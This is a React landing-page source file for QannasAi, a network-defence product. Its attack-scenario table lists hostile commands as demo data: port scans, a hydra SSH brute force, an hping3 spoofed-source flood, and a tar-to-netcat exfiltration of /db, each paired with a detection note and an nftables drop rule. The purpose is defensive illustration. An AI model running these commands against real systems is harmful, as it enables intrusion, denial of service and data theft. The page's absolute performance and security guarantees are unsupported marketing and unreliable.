import React, { useState, useEffect, useRef } from 'react';
import { Link } from 'react-router-dom';
import { motion, AnimatePresence } from 'framer-motion';
import { 
  Shield, 
  Zap, 
  Cpu, 
  Lock, 
  Activity, 
  Terminal, 
  CheckCircle2, 
  ArrowRight, 
  ArrowUpRight, 
  Copy, 
  Check, 
  ChevronDown, 
  Plus, 
  Minus, 
  Radio, 
  Sliders, 
  Database, 
  Crosshair, 
  ExternalLink, 
  ChevronRight, 
  HardDrive, 
  Cpu as Microchip, 
  Gauge,
  Layers,
  Sparkles,
  GitCommit,
  Network
} from 'lucide-react';
import ShaderGradientBackground from '../components/ShaderGradientBackground';
import WaterRippleGridCanvas from '../components/WaterRippleGridCanvas';
import WireEnclaveCockpit from '../components/WireEnclaveCockpit';
import LiquidGlassFilter from '../components/LiquidGlassFilter';
import './LandingPage.css';

/* ── REUSABLE LIQUID GLASS CARD ── */
function LiquidCard({ children, className = '', onClick, ...props }) {
  const cardRef = useRef(null);

  const handleMouseMove = (e) => {
    if (!cardRef.current) return;
    const rect = cardRef.current.getBoundingClientRect();
    const x = e.clientX - rect.left;
    const y = e.clientY - rect.top;
    cardRef.current.style.setProperty('--mouse-x', `${x}px`);
    cardRef.current.style.setProperty('--mouse-y', `${y}px`);
  };

  return (
    <div 
      ref={cardRef} 
      className={`cq-liquid-card ${className}`} 
      onMouseMove={handleMouseMove}
      onClick={onClick}
      {...props}
    >
      <div className="cq-liquid-specular-glow" />
      <div className="cq-liquid-border-sheen" />
      <div className="cq-liquid-card-content">
        {children}
      </div>
    </div>
  );
}

/* ── 10 MITRE ATT&CK SCENARIOS (VERIFIED DATA) ── */
const SCENARIOS = [
  {
    id: '01',
    category: 'recon',
    name: 'TCP SYN Port Scan',
    mitre: 'T1046',
    route: '10.0.1.10 → 10.0.4.10',
    command: 'nmap -sS -p 1-100 10.0.4.10',
    verdict: 'ISOLATED',
    latency: '38ms',
    neuralDetection: 'GCN topological fan-out anomaly (Degree > 85, SYN-ACK ratio < 0.05)',
    kernelAction: 'nft add rule inet filter input ip saddr 10.0.1.10 drop'
  },
  {
    id: '02',
    category: 'dos',
    name: 'HTTP Request Burst',
    mitre: 'T1499.001',
    route: '10.0.1.10 → 10.0.4.10:80',
    command: 'for i in {1..15}; do curl -s http://10.0.4.10/ & done',
    verdict: 'ISOLATED',
    latency: '41ms',
    neuralDetection: '1D-CNN temporal burst waveform spike (Packet delta-t < 33ms)',
    kernelAction: 'nft add rule inet filter input ip saddr 10.0.1.10 tcp dport 80 drop'
  },
  {
    id: '03',
    category: 'lateral',
    name: 'Internal Lateral Sweep',
    mitre: 'T1021',
    route: '10.0.5.10 → 10.0.4.10',
    command: 'nc -zv 10.0.4.10 21 22 80 443 3306',
    verdict: 'ISOLATED',
    latency: '42ms',
    neuralDetection: 'GCN bipartite cross-namespace link anomaly between isolated segments',
    kernelAction: 'nft add rule inet filter forward ip saddr 10.0.5.10 ip daddr 10.0.4.10 drop'
  },
  {
    id: '04',
    category: 'recon',
    name: 'Web Directory Discovery',
    mitre: 'T1083',
    route: '10.0.1.10 → 10.0.4.10:80',
    command: 'dirb http://10.0.4.10/ -r',
    verdict: 'ISOLATED',
    latency: '39ms',
    neuralDetection: 'Temporal entropy spike on HTTP 404 response clusters via 1D-CNN',
    kernelAction: 'nft add rule inet filter input ip saddr 10.0.1.10 drop'
  },
  {
    id: '05',
    category: 'recon',
    name: 'SSH Connection Probing',
    mitre: 'T1021.004',
    route: '10.0.1.10 → 10.0.4.10:22',
    command: 'hydra -l root -P pass.txt ssh://10.0.4.10',
    verdict: 'ISOLATED',
    latency: '37ms',
    neuralDetection: 'GCN repeated single-target vertex edge weight accumulation',
    kernelAction: 'nft add rule inet filter input ip saddr 10.0.1.10 tcp dport 22 drop'
  },
  {
    id: '06',
    category: 'exfil',
    name: 'Outbound Exfiltration Flow',
    mitre: 'T1041',
    route: '10.0.4.10 → 10.0.1.10:9000',
    command: 'tar -czf - /db | nc 10.0.1.10 9000',
    verdict: 'ISOLATED',
    latency: '40ms',
    neuralDetection: '1D-CNN payload egress volume ratio anomaly (Outbound bytes > 50x inbound)',
    kernelAction: 'nft add rule inet filter forward ip saddr 10.0.4.10 ip daddr 10.0.1.10 drop'
  },
  {
    id: '07',
    category: 'lateral',
    name: 'Internal Endpoint Crawl',
    mitre: 'T1018',
    route: '10.0.5.10 → 10.0.4.10',
    command: 'curl -s http://10.0.4.10/internal-api/',
    verdict: 'ISOLATED',
    latency: '42ms',
    neuralDetection: 'Zero-Trust policy violation: Unauthorized service role adjacency in GNN',
    kernelAction: 'nft add rule inet filter input ip saddr 10.0.5.10 drop'
  },
  {
    id: '08',
    category: 'recon',
    name: 'Aggressive Full Port Scan',
    mitre: 'T1046',
    route: '10.0.1.10 → 10.0.4.10',
    command: 'nmap -A -T4 10.0.4.10',
    verdict: 'ISOLATED',
    latency: '38ms',
    neuralDetection: 'GCN bipartite density spike (Edge count delta > 400 within 50ms window)',
    kernelAction: 'nft add rule inet filter input ip saddr 10.0.1.10 drop'
  },
  {
    id: '09',
    category: 'dos',
    name: 'High-Rate TCP Inundation',
    mitre: 'T1498',
    route: '10.0.1.10 → 10.0.4.10:80',
    command: 'hping3 -S -p 80 --flood --rand-source 10.0.4.10',
    verdict: 'ISOLATED',
    latency: '39ms',
    neuralDetection: '1D-CNN inter-arrival time collapse to 0μs across spoofed source cluster',
    kernelAction: 'nft add rule inet filter input tcp dport 80 drop'
  },
  {
    id: '10',
    category: 'baseline',
    name: 'Legitimate Microservice Traffic',
    mitre: 'BENIGN',
    route: '10.0.2.14 → 10.0.4.10:80',
    command: 'curl -s http://10.0.4.10/api/health',
    verdict: 'AUTHORIZED',
    latency: '0ms',
    neuralDetection: 'Baseline topology adherence: Node embedding distance < 0.05 from centroid',
    kernelAction: 'nft pass (Rule chain bypass, zero latency overhead)'
  }
];

/* ── "WHY QANNASAI" ARCHITECTURAL PARADIGM SHIFT ── */
const WHY_US_PILLARS = [
  {
    id: '01',
    metric: '0.00% LATERAL BLEED',
    title: 'Zero Lateral Blast Radius',
    problem: 'Perimeter firewalls assume internal traffic is trusted. Once breached, attackers move laterally across subnets for an average of 204 days undetected.',
    solution: 'QannasAi enforces micro-segmentation at Netfilter Priority 0. Rogue sockets are severed at packet zero before adjacent endpoints receive a single SYN packet.',
    tags: ['Netfilter Priority 0', 'Micro-segmentation', 'Zero Lateral Drift']
  },
  {
    id: '02',
    metric: '< 38.4MS VS 27 MINS',
    title: 'Autonomous Wire Containment',
    problem: 'SOC teams drown in 10,000+ daily alerts. Average human triage and escalation takes 15 to 45 minutes—an eternity in automated microsecond attacks.',
    solution: 'Fully autonomous Observe-Orient-Decide-Act loop executes in-process. Decisions are mathematically derived and enforced in under 42ms with zero human bottleneck.',
    tags: ['Sub-42ms SLA', 'Closed-Loop PEP', 'Zero Alert Fatigue']
  },
  {
    id: '03',
    metric: 'TOPOLOGICAL + TEMPORAL',
    title: 'Graph Neural Detection',
    problem: 'Signature databases fail against polymorphic ransomware and obfuscated scripts that evade static YARA and heuristic antivirus scans.',
    solution: 'Dual-engine neural architecture combines GraphSAGE spatial graph topology (identifying unnatural node clustering) with 1D-CNN temporal burst waveform analysis.',
    tags: ['GraphSAGE GNN', '1D-CNN Waveforms', 'Zero-Day Resilient']
  },
  {
    id: '04',
    metric: 'GALVANIC AIRGAP',
    title: 'Physical Hardware Kill-Switch',
    problem: 'In critical infrastructure and defense enclaves, software-only isolation can be undermined by kernel implants or firmware rootkits.',
    solution: 'Embedded Arduino Uno R3 serial bridge (/dev/ttyACM0) actuates physical optocoupled relay switches to provide true physical air-gap disconnection.',
    tags: ['Arduino Uno R3', 'Optocoupled Relays', 'ICS/OT Airgap']
  }
];

/* ── UAE CYBERSECURITY COUNCIL ALIGNED PILLARS ── */
const UAE_COUNCIL_PILLARS = [
  {
    num: 'PILLAR 01',
    arabic: 'حماية البنية التحتية الحيوية',
    title: 'Critical National Infrastructure Defense',
    desc: 'Micro-segmentation at Netfilter Priority 0 preserves sovereign continuity for utility, energy, financial, and government networks by blocking lateral spread at packet zero.',
    guarantee: 'Zero Lateral Bleed across sovereign subnets'
  },
  {
    num: 'PILLAR 02',
    arabic: 'الاستجابة الاستباقية للتهديدات',
    title: 'Proactive Wire-Speed Containment',
    desc: 'Sub-42ms autonomous OODA loop detects and arrests adversarial zero-day intrusions on-wire, eliminating dependencies on external cross-border cloud APIs.',
    guarantee: 'Deterministic wire drop in < 38.4ms'
  },
  {
    num: 'PILLAR 03',
    arabic: 'إطار الثقة الصفرية الوطني',
    title: 'Sovereign Zero-Trust Architecture',
    desc: 'Replaces vulnerable perimeter assumptions with continuous spatial topology verification via GraphSAGE across hybrid national government enclaves.',
    guarantee: '100% continuous graph adjacency verification'
  },
  {
    num: 'PILLAR 04',
    arabic: 'الامتثال لمعايير IAS و NESA',
    title: 'Information Assurance (IAS) Compliance',
    desc: 'Ensures 100% local telemetry retention, verifiable zero-drift baselines, and optional physical airgap relay isolation in strict accordance with UAE security standards.',
    guarantee: 'Zero foreign data egress, on-premises sovereignty'
  }
];

/* ── ENTERPRISE HEAD-TO-HEAD COMPARISON MATRIX ── */
const COMPARISON_ROWS = [
  {
    metric: 'Containment SLA (TTR)',
    qannas: '< 38.4ms (Deterministic)',
    ngfw: '850ms+ (Queue lag)',
    edr: '320ms+ (Daemon lag)',
    siem: '15 – 45 Minutes (Human SOC)',
    highlight: true
  },
  {
    metric: 'Enforcement Layer',
    qannas: 'Linux Kernel Priority 0',
    ngfw: 'User-Space Proxy',
    edr: 'OS Agent Hook',
    siem: 'API Webhook / Cloud',
    highlight: true
  },
  {
    metric: 'Lateral Blast Radius',
    qannas: '0 ms (Zero Lateral Spread)',
    ngfw: 'Entire Subnet at Risk',
    edr: 'Host Endpoint Exposed',
    siem: 'Full Enterprise Breach',
    highlight: true
  },
  {
    metric: 'Decision Engine',
    qannas: 'GraphSAGE GNN + 1D-CNN',
    ngfw: 'Static IP / Port Rules',
    edr: 'Signatures & Heuristics',
    siem: 'Log Queries & Playbooks',
    highlight: false
  },
  {
    metric: 'Host CPU / Overhead',
    qannas: '< 0.5% (64MB Ring Buffer)',
    ngfw: 'High Packet Inspection Lag',
    edr: 'Heavy CPU Agent Bloat',
    siem: 'Gigabytes Log Egress',
    highlight: false
  },
  {
    metric: 'Hardware Air-Gap Link',
    qannas: 'Physical Serial Relay Bridge',
    ngfw: 'None',
    edr: 'None',
    siem: 'None',
    highlight: true
  },
  {
    metric: 'Autonomous Action',
    qannas: '100% Wire Drop (Zero Touch)',
    ngfw: 'Manual Rule Updates',
    edr: 'Quarantine Prompts',
    siem: 'Ticket Created for Analyst',
    highlight: false
  }
];

/* ── 4-STAGE AUTONOMOUS ISOLATION PIPELINE ── */
const PIPELINE_STEPS = [
  {
    step: '01',
    name: 'Frame Ingestion',
    tech: 'AF_PACKET / eBPF Hook',
    latency: '0.2ms',
    desc: 'High-speed kernel driver intercepts raw Layer 2/3 frames into a 64MB memory-mapped ring buffer with zero socket copy overhead.',
    code: 'int fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));\nsetsockopt(fd, SOL_PACKET, PACKET_RX_RING, &req, sizeof(req));',
    guarantee: 'Wire rate throughput, zero packet drop, sub-millisecond tap.'
  },
  {
    step: '02',
    name: 'Dual Neural Reasoning',
    tech: 'GraphSAGE GNN + 1D-CNN',
    latency: '32.1ms',
    desc: 'Suricata feeds network flows to GraphSAGE for spatial graph topological adjacency analysis while 1D-CNN inspects microsecond packet arrival timing entropy.',
    code: 'z_v = GraphSAGE_Forward(Adj_Matrix, Host_Features);\np_burst = CNN_1D_Inference(packet_delta_t_tensor);',
    guarantee: 'Spatial anomaly detection with zero signature reliance.'
  },
  {
    step: '03',
    name: 'Netfilter Kernel Drop',
    tech: 'Linux Netfilter Priority 0',
    latency: '5.8ms',
    desc: 'Policy enforcement point (PEP) injects dynamic nftables rules at hook priority 0 to sever hostile sockets before packet zero can traverse.',
    code: 'nft add rule inet filter input ip saddr $HOSTILE_IP drop\nnft add rule inet filter forward ip saddr $HOSTILE_IP drop',
    guarantee: '0.00% lateral bleed, deterministic socket severance.'
  },
  {
    step: '04',
    name: 'Hardware Airgap Link',
    tech: 'Arduino Uno R3 Serial Relay',
    latency: '0.3ms',
    desc: 'Autonomous daemon sends hardware pulse to optocoupled relay bridge over /dev/ttyACM0 for physical isolation of critical OT/ICS enclaves.',
    code: 'ser.write(b"ISOLATE_PIN_11\\n")\n// Physical relay coil trips within 300 microseconds',
    guarantee: 'Galvanic physical severance mathematically safe against OS rootkits.'
  }
];

export default function LandingPage() {
  const [hero3DMode, setHero3DMode] = useState('gcn'); // 'gcn' | 'cnn' | 'kernel'
  const [selectedScenario, setSelectedScenario] = useState(SCENARIOS[0]);
  const [activePipelineStep, setActivePipelineStep] = useState('01');
  const [isSimulating, setIsSimulating] = useState(false);
  const [copiedId, setCopiedId] = useState(null);

  const copyCommand = (id, text) => {
    navigator.clipboard.writeText(text);
    setCopiedId(id);
    setTimeout(() => setCopiedId(null), 2000);
  };

  const runSimulation = () => {
    if (isSimulating) return;
    setIsSimulating(true);

    setTimeout(() => {
      setIsSimulating(false);
    }, 3200);
  };

  const currentStepData = PIPELINE_STEPS.find(s => s.step === activePipelineStep) || PIPELINE_STEPS[0];

  return (
    <div className="cq-root">
      {/* ── SVG OPTICAL REFRACTION FILTER ── */}
      <LiquidGlassFilter />

      {/* ── TOP ARCHITECTURAL HEADER (LOCKED TO TOP EDGE, ZERO CLASH) ── */}
      <header className="cq-header">
        <div className="cq-header-inner">
          <Link to="/home" className="cq-brand">
            <div className="cq-brand-logo">
              <Shield className="w-4 h-4 text-emerald-400 relative z-10" />
            </div>
            <div className="cq-brand-info">
              <span className="cq-brand-name">QANNASAI</span>
              <span className="cq-brand-badge">CORE 2.4</span>
            </div>
          </Link>

          <nav className="cq-nav">
            <a href="#hero">Overview</a>
            <a href="#why-us">Why Us</a>
            <a href="#comparison">Benchmark</a>
            <a href="#pipeline">Pipeline</a>
            <a href="#uae-council">UAE Council</a>
            <a href="#matrix">Vector Matrix</a>
            <a href="#latency">Speedometer</a>
            <a href="#workspace">Workspace</a>
          </nav>

          <div className="cq-header-actions">
            <Link to="/" className="cq-btn-primary cq-liquid-btn">
              <span>Operations Center</span>
              <ArrowUpRight className="w-3.5 h-3.5 ml-1 inline-block" />
            </Link>
          </div>
        </div>
      </header>

      {/* ── SECTION 01: ASYMMETRIC SPLIT HERO ── */}
      <section id="hero" className="cq-hero-split">
        {/* Three.js WebGL Fluid Wave Plane */}
        <ShaderGradientBackground 
          opacity={0.35}
          color1="#040711"
          color2="#1e293b"
          color3="#0f2b3e"
          uSpeed={0.14}
          uStrength={1.8}
        />

        {/* Subtle Water Ripple & Architectural Box Grid */}
        <WaterRippleGridCanvas 
          cellSize={76}
          damping={0.962}
          rippleIntensity={100}
          showCrosshair={true}
        />

        <div className="cq-container" style={{ position: 'relative', zIndex: 10 }}>
          <div className="cq-hero-split-grid">
            
            {/* ── LEFT COLUMN: EDITORIAL TYPOGRAPHY & SIMPLE STRONG PUNCHLINE ── */}
            <div className="cq-hero-left-col">
              
              {/* Simple But Strong Punchline (No clunky header badges) */}
              <motion.h1 
                className="cq-hero-split-title"
                initial={{ opacity: 0, y: 16 }}
                animate={{ opacity: 1, y: 0 }}
                transition={{ duration: 0.6 }}
              >
                Never Trust. <br />
                <span className="cq-punchline-accent">Always Isolate.</span>
              </motion.h1>

              {/* Minimalist Subtext */}
              <motion.p 
                className="cq-hero-split-desc"
                initial={{ opacity: 0, y: 16 }}
                animate={{ opacity: 1, y: 0 }}
                transition={{ duration: 0.6, delay: 0.15 }}
              >
                Autonomous Linux kernel defense. GraphSAGE spatial topology reasoning and 1D-CNN temporal burst detection sever hostile sockets in under 42 milliseconds—before lateral movement begins.
              </motion.p>

              {/* Interactive Mode Switcher Deck */}
              <motion.div 
                className="cq-mode-pill-bar" 
                style={{ 
                  display: 'inline-flex', 
                  gap: '6px', 
                  padding: '5px', 
                  background: 'rgba(9, 13, 20, 0.85)', 
                  backdropFilter: 'blur(20px)', 
                  border: '1px solid rgba(255, 255, 255, 0.08)', 
                  borderRadius: '9999px',
                  marginBottom: '26px'
                }}
                initial={{ opacity: 0, y: 16 }}
                animate={{ opacity: 1, y: 0 }}
                transition={{ duration: 0.6, delay: 0.2 }}
              >
                <button 
                  onClick={() => setHero3DMode('gcn')}
                  className={`cq-mode-btn ${hero3DMode === 'gcn' ? 'active' : ''}`}
                  style={{
                    padding: '8px 16px',
                    borderRadius: '9999px',
                    fontFamily: 'var(--cq-font-mono)',
                    fontSize: '11px',
                    fontWeight: 600,
                    border: 'none',
                    cursor: 'pointer',
                    background: hero3DMode === 'gcn' ? 'rgba(45, 212, 191, 0.18)' : 'transparent',
                    color: hero3DMode === 'gcn' ? 'var(--cq-mint)' : 'var(--cq-text-muted)',
                    transition: 'all 0.2s ease',
                    display: 'flex',
                    alignItems: 'center',
                    gap: '6px'
                  }}
                >
                  <span className="gl-tile-diamond" style={{ background: hero3DMode === 'gcn' ? 'var(--cq-mint)' : 'var(--cq-titanium)' }} />
                  <span>01 SPATIAL GCN</span>
                </button>

                <button 
                  onClick={() => setHero3DMode('cnn')}
                  className={`cq-mode-btn ${hero3DMode === 'cnn' ? 'active' : ''}`}
                  style={{
                    padding: '8px 16px',
                    borderRadius: '9999px',
                    fontFamily: 'var(--cq-font-mono)',
                    fontSize: '11px',
                    fontWeight: 600,
                    border: 'none',
                    cursor: 'pointer',
                    background: hero3DMode === 'cnn' ? 'rgba(56, 189, 248, 0.18)' : 'transparent',
                    color: hero3DMode === 'cnn' ? 'var(--cq-cobalt)' : 'var(--cq-text-muted)',
                    transition: 'all 0.2s ease',
                    display: 'flex',
                    alignItems: 'center',
                    gap: '6px'
                  }}
                >
                  <span className="gl-tile-diamond" style={{ background: hero3DMode === 'cnn' ? 'var(--cq-cobalt)' : 'var(--cq-titanium)' }} />
                  <span>02 TEMPORAL CNN</span>
                </button>

                <button 
                  onClick={() => setHero3DMode('kernel')}
                  className={`cq-mode-btn ${hero3DMode === 'kernel' ? 'active' : ''}`}
                  style={{
                    padding: '8px 16px',
                    borderRadius: '9999px',
                    fontFamily: 'var(--cq-font-mono)',
                    fontSize: '11px',
                    fontWeight: 600,
                    border: 'none',
                    cursor: 'pointer',
                    background: hero3DMode === 'kernel' ? 'rgba(245, 158, 11, 0.18)' : 'transparent',
                    color: hero3DMode === 'kernel' ? 'var(--cq-amber)' : 'var(--cq-text-muted)',
                    transition: 'all 0.2s ease',
                    display: 'flex',
                    alignItems: 'center',
                    gap: '6px'
                  }}
                >
                  <span className="gl-tile-diamond" style={{ background: hero3DMode === 'kernel' ? 'var(--cq-amber)' : 'var(--cq-titanium)' }} />
                  <span>03 KERNEL PEP</span>
                </button>
              </motion.div>

              {/* Action Buttons */}
              <motion.div 
                style={{ display: 'flex', gap: '14px', flexWrap: 'wrap', marginBottom: '22px' }}
                initial={{ opacity: 0, y: 16 }}
                animate={{ opacity: 1, y: 0 }}
                transition={{ duration: 0.6, delay: 0.25 }}
              >
                <Link to="/" className="cq-btn-hero-solid cq-liquid-action-btn">
                  <span>Enter Operations Center</span>
                  <div className="cq-btn-hero-arrow">
                    <ArrowRight className="w-4 h-4" />
                  </div>
                </Link>

                <a href="#why-us" className="cq-btn-hero-glass cq-liquid-pill-glass">
                  <span>Why QannasAi</span>
                  <ChevronDown className="w-4 h-4 ml-1 opacity-70" />
                </a>
              </motion.div>

              {/* Telemetry Micro-Strip */}
              <motion.div 
                className="cq-telemetry-micro-strip"
                initial={{ opacity: 0 }}
                animate={{ opacity: 1 }}
                transition={{ duration: 0.6, delay: 0.3 }}
              >
                <span>LATENCY: <strong>38.4MS</strong></span>
                <span>AF_PACKET: <strong>64MB RING</strong></span>
                <span>DRIFT: <strong>0.0%</strong></span>
                <span>PRIORITY: <strong>LEVEL 0</strong></span>
              </motion.div>

            </div>

            {/* ── RIGHT COLUMN: HIGH-PRECISION INTERACTIVE WIRE ENCLAVE HUD (NO SHIELD) ── */}
            <motion.div 
              className="cq-hero-right-col"
              initial={{ opacity: 0, scale: 0.96 }}
              animate={{ opacity: 1, scale: 1 }}
              transition={{ duration: 0.7, delay: 0.2 }}
            >
              <WireEnclaveCockpit 
                mode={hero3DMode} 
                onSimulateAttack={(meta) => {
                  console.log('Interception simulated:', meta);
                }}
              />
            </motion.div>

          </div>
        </div>
      </section>

      {/* ── DELINEATION DASHED LINE ── */}
      <div className="gl-dash-line-h">
        <div className="gl-dash-diamond left" />
        <div className="gl-dash-diamond center" />
        <div className="gl-dash-diamond right" />
      </div>

      {/* ── SECTION 02: "WHY QANNASAI" ARCHITECTURAL PARADIGM SHIFT (`#why-us`) ── */}
      <section id="why-us" className="cq-section" style={{ padding: '80px 0' }}>
        <div className="cq-container">
          
          <div className="cq-section-header" style={{ marginBottom: '48px' }}>
            <div className="cq-section-pill">
              <span className="gl-tile-diamond" />
              <span>Why QannasAi</span>
            </div>
            <h2 className="cq-section-title">
              Why Traditional Security Fails at the Wire
            </h2>
            <p className="cq-section-desc">
              Perimeters fall. Alerts drown human analysts. We re-engineered threat containment directly into the Linux kernel layer.
            </p>
          </div>

          <div className="cq-why-us-grid">
            {WHY_US_PILLARS.map((pillar) => (
              <div key={pillar.id} className="cq-why-card">
                <div>
                  <div className="cq-why-top">
                    <h3 className="cq-why-title" style={{ margin: 0 }}>{pillar.title}</h3>
                    <span className="cq-why-metric-pill">
                      {pillar.metric}
                    </span>
                  </div>

                  <div className="cq-why-problem" style={{ marginTop: '16px' }}>
                    <strong>THE DEFICIENCY</strong>
                    {pillar.problem}
                  </div>

                  <div className="cq-why-solution">
                    <strong>THE QANNASAI ADVANTAGE</strong>
                    {pillar.solution}
                  </div>
                </div>

                <div className="cq-why-footer-tags">
                  {pillar.tags.map((tag, idx) => (
                    <span key={idx} className="cq-why-tag">{tag}</span>
                  ))}
                </div>
              </div>
            ))}
          </div>

        </div>
      </section>

      {/* ── DELINEATION DASHED LINE ── */}
      <div className="gl-dash-line-h">
        <div className="gl-dash-diamond left" />
        <div className="gl-dash-diamond center" />
        <div className="gl-dash-diamond right" />
      </div>

      {/* ── SECTION 03: ENTERPRISE HEAD-TO-HEAD COMPARISON MATRIX (`#comparison`) ── */}
      <section id="comparison" className="cq-section" style={{ padding: '80px 0' }}>
        <div className="cq-container">
          
          <div className="cq-section-header" style={{ marginBottom: '40px' }}>
            <div className="cq-section-pill">
              <span className="gl-tile-diamond" />
              <span>Speed &amp; Architecture Benchmark</span>
            </div>
            <h2 className="cq-section-title">
              Engineered for Zero Trust. Proven by Milliseconds.
            </h2>
            <p className="cq-section-desc">
              A direct architectural comparison against Next-Gen Firewalls, User-Space EDR daemons, and Cloud SIEMs.
            </p>
          </div>

          <div className="cq-comparison-table-wrap">
            <table className="cq-comparison-table">
              <thead>
                <tr>
                  <th style={{ width: '26%' }}>ARCHITECTURE DIMENSION</th>
                  <th className="col-qannas" style={{ width: '28%' }}>
                    QANNASAI KERNEL CORE
                  </th>
                  <th style={{ width: '15%' }}>LEGACY NGFW</th>
                  <th style={{ width: '15%' }}>USER-SPACE EDR</th>
                  <th style={{ width: '16%' }}>CLOUD SIEM / SOAR</th>
                </tr>
              </thead>
              <tbody>
                {COMPARISON_ROWS.map((row, idx) => (
                  <tr key={idx}>
                    <td className="dim-title">{row.metric}</td>
                    <td className="col-qannas">
                      <span className="cq-table-chip green">
                        <CheckCircle2 className="w-3 h-3 mr-1 inline-block" />
                        {row.qannas}
                      </span>
                    </td>
                    <td>
                      <span className="cq-table-chip red">{row.ngfw}</span>
                    </td>
                    <td>
                      <span className="cq-table-chip amber">{row.edr}</span>
                    </td>
                    <td>
                      <span className="cq-table-chip red">{row.siem}</span>
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>

        </div>
      </section>

      {/* ── DELINEATION DASHED LINE ── */}
      <div className="gl-dash-line-h">
        <div className="gl-dash-diamond left" />
        <div className="gl-dash-diamond center" />
        <div className="gl-dash-diamond right" />
      </div>

      {/* ── SECTION 04: 4-STAGE AUTONOMOUS PIPELINE (`#pipeline`) ── */}
      <section id="pipeline" className="cq-section" style={{ padding: '80px 0' }}>
        <div className="cq-container">
          
          <div className="cq-section-header" style={{ marginBottom: '36px' }}>
            <div className="cq-section-pill">
              <span className="gl-tile-diamond" />
              <span>Autonomous Isolation Pipeline</span>
            </div>
            <h2 className="cq-section-title">
              From Wire Ingest to Kernel Sever in 38.4ms
            </h2>
            <p className="cq-section-desc">
              Inspect the four deterministic execution stages executed during every hostile socket intervention.
            </p>
          </div>

          {/* Stepper Navigation Buttons */}
          <div className="cq-pipeline-nav">
            {PIPELINE_STEPS.map((s) => (
              <button 
                key={s.step}
                onClick={() => setActivePipelineStep(s.step)}
                className={`cq-pipeline-tab-btn ${activePipelineStep === s.step ? 'active' : ''}`}
              >
                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                  <span className="cq-tab-step-num">STAGE {s.step}</span>
                  <span className="cq-tab-step-latency">{s.latency}</span>
                </div>
                <span className="cq-tab-step-name">{s.name}</span>
                <span style={{ fontSize: '11px', color: 'var(--cq-text-dim)' }}>{s.tech}</span>
              </button>
            ))}
          </div>

          {/* Active Step Detailed Cockpit Screen */}
          <div className="cq-pipeline-screen">
            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start', flexWrap: 'wrap', gap: '16px', borderBottom: '1px solid rgba(255, 255, 255, 0.08)', paddingBottom: '20px', marginBottom: '22px' }}>
              <div>
                <div style={{ fontFamily: 'var(--cq-font-mono)', fontSize: '11px', color: 'var(--cq-mint)', marginBottom: '4px' }}>
                  STAGE #{currentStepData.step} · {currentStepData.tech}
                </div>
                <h3 style={{ fontSize: '22px', fontWeight: 800, color: '#ffffff', margin: 0 }}>
                  {currentStepData.name}
                </h3>
              </div>

              <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
                <span style={{ fontFamily: 'var(--cq-font-mono)', fontSize: '18px', fontWeight: 800, color: 'var(--cq-amber)' }}>
                  {currentStepData.latency}
                </span>
                <span className="cq-table-chip green">DETERMINISTIC</span>
              </div>
            </div>

            <p style={{ fontSize: '15px', lineHeight: 1.6, color: 'var(--cq-text-muted)', marginBottom: '22px' }}>
              {currentStepData.desc}
            </p>

            <div className="cq-telemetry-grid-2" style={{ marginBottom: 0 }}>
              <div className="cq-screen-card">
                <span className="cq-screen-lbl">IN-KERNEL LOGIC / DRIVER INVOCATION</span>
                <pre style={{ margin: 0, fontFamily: 'var(--cq-font-mono)', fontSize: '12px', color: 'var(--cq-mint)', overflowX: 'auto', lineHeight: 1.5 }}>
                  {currentStepData.code}
                </pre>
              </div>

              <div className="cq-screen-card">
                <span className="cq-screen-lbl">DETERMINISTIC GUARANTEE</span>
                <div style={{ display: 'flex', alignItems: 'center', gap: '8px', color: '#ffffff', fontSize: '14px', fontWeight: 600 }}>
                  <CheckCircle2 className="w-4 h-4 text-emerald-400 flex-shrink-0" />
                  <span>{currentStepData.guarantee}</span>
                </div>
              </div>
            </div>
          </div>

        </div>
      </section>

      {/* ── DELINEATION DASHED LINE ── */}
      <div className="gl-dash-line-h">
        <div className="gl-dash-diamond left" />
        <div className="gl-dash-diamond center" />
        <div className="gl-dash-diamond right" />
      </div>

      {/* ── SECTION 05: UAE CYBERSECURITY COUNCIL ALIGNMENT (CINEMATIC BACKDROP) ── */}
      <section id="uae-council" className="cq-uae-section">
        <div className="cq-uae-bg-img" />
        <div className="cq-uae-bg-overlay" />

        <div className="cq-container" style={{ position: 'relative', zIndex: 10 }}>
          
          <div className="cq-section-header" style={{ marginBottom: '46px' }}>
            <div className="cq-section-pill" style={{ borderColor: 'rgba(245, 158, 11, 0.3)', color: 'var(--cq-amber)' }}>
              <span className="gl-tile-diamond" style={{ background: 'var(--cq-amber)' }} />
              <span>UAE Cybersecurity Council Alignment</span>
            </div>
            <h2 className="cq-section-title">
              Anchored in National Sovereign Cyber Defense
            </h2>
            <p className="cq-section-desc">
              Engineered in direct alignment with the UAE Cyber Security Council national pillars: sovereign infrastructure protection, proactive wire containment, and zero-trust resilience.
            </p>
          </div>

          <div className="cq-uae-pillars-grid">
            {UAE_COUNCIL_PILLARS.map((pillar, idx) => (
              <div key={idx} className="cq-uae-card">
                <div>
                  <div className="cq-uae-card-header">
                    <span className="cq-uae-card-num">{pillar.num}</span>
                    <span className="cq-uae-arabic-tag">{pillar.arabic}</span>
                  </div>

                  <h3 className="cq-uae-card-title">{pillar.title}</h3>
                  <p className="cq-uae-card-desc">{pillar.desc}</p>
                </div>

                <div className="cq-uae-card-guarantee">
                  <CheckCircle2 className="w-4 h-4 text-emerald-400 flex-shrink-0" />
                  <span>{pillar.guarantee}</span>
                </div>
              </div>
            ))}
          </div>

        </div>
      </section>

      {/* ── DELINEATION DASHED LINE ── */}
      <div className="gl-dash-line-h">
        <div className="gl-dash-diamond left" />
        <div className="gl-dash-diamond center" />
        <div className="gl-dash-diamond right" />
      </div>

      {/* ── SECTION 06: TACTICAL 10-VECTOR LAUNCHPAD (`#matrix`) ── */}
      <section id="matrix" className="cq-section" style={{ padding: '80px 0' }}>
        <div className="cq-container">
          
          <div className="cq-section-header" style={{ marginBottom: '30px' }}>
            <div className="cq-section-pill">
              <span className="gl-tile-diamond" />
              <span>10-Vector Attack Matrix</span>
            </div>
            <h2 className="cq-section-title">
              Wire-Speed Containment Testing
            </h2>
            <p className="cq-section-desc">
              Select any verified attack scenario to inspect the payload and execute wire-speed kernel containment.
            </p>
          </div>

          {/* Visual Compact Vector Chip Board */}
